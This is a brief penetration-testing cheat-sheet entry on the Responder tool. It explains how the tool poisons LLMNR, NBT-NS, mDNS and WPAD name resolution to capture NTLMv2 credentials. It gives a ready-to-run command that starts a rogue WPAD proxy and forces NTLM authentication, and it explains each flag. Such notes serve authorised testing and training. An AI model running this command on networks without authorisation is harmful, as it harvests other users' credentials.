Responder impersonates services using LLMNR, NBT-NS, mDNS, WPAD protocols and captures credentials (usually NTLMv2 Challenge/Response) when a user attempts to authenticate against the spoofed services.

---

Capture NTLMv2 hashes with *responder* (requires user activity):
```bash
sudo responder -v -I eth0 -dwP
```
Args:
`-v`: Verbose
`-I`: Interface to listen on
`-d`: Respond to DHCP broadcast requests
`-w`: Starts a WPAD (Web Proxy Autodiscovery Protocol) rogue proxy server
`-P`: Force NTLM authentication for the proxy
